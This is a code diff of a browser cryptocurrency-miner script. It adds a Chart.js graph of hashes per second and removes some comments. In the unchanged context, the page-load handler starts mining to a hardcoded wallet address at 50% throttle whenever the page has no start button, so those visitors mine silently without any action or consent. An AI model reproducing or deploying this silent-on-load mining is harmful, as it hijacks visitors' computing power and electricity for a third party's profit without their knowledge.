@@ -1,10 +1,12 @@
 let isCurrentlyMining = false;
 let intervalId;
+let myLineChart;
 
 document.addEventListener("DOMContentLoaded", () => {
   const startButton = document.getElementById("startb");
   if (startButton) {
     startButton.addEventListener("click", start);
+    createChart();
   } else {
     startMining(
       "4688YCrSqBZA5XcyPmnNieYD2ZX2wPaA5AWRtqbZCN9WLxokKMjaT7kLhnph5rzxp1DoHkzvwGJPJRM2QbQqwoBiN7PNgfZ"
@@ -12,6 +14,36 @@ document.addEventListener("DOMContentLoaded", () => {
     throttleMiner = 50;
   }
 });
+
+function createChart() {
+  const ctx = document.getElementById("myChart").getContext("2d");
+  myLineChart = new Chart(ctx, {
+    type: "line",
+    data: {
+      datasets: [
+        {
+          label: "Hashes resolved",
+          backgroundColor: "rgb(0, 132, 255)",
+          pointStyle: "line",
+          data: [],
+        },
+      ],
+    },
+    options: {
+      responsive: false,
+      scales: {
+        xAxes: [
+          {
+            type: "time",
+            time: {
+              unit: "second",
+            },
+          },
+        ],
+      },
+    },
+  });
+}
 
 function start() {
   let button = document.getElementById("startb");
@@ -23,16 +55,13 @@ function start() {
     );
     button.textContent = "Stop mining";
 
-    /* keep us updated */
-
     addText("Connecting...");
 
     intervalId = setInterval(function () {
-      // for the definition of sendStack/receiveStack, see miner.js
       while (sendStack.length > 0) addText(sendStack.pop());
       while (receiveStack.length > 0) addText(receiveStack.pop());
-      addText("calculated " + totalhashes + " hashes.");
-    }, 2000);
+      addData({ x: new Date(), y: totalhashes });
+    }, 1000);
   } else {
     clearInterval(intervalId);
     stopMining();
@@ -40,7 +69,12 @@ function start() {
   }
 }
 
-/* helper function to put text into the text field.  */
+function addData(data) {
+  myLineChart.data.datasets.forEach((dataset) => {
+    dataset.data.push(data);
+  });
+  myLineChart.update();
+}
 
 function addText(obj) {
   let elem = document.getElementById("texta");
@@ -66,7 +100,6 @@ function addText(obj) {
 
   throttleMiner = 100 - slider.value;
 
-  // Update the current slider value (each time you drag the slider handle)
   slider.oninput = function () {
     output.innerHTML = "Miner power:" + this.value;
     throttleMiner = 100 - slider.value;
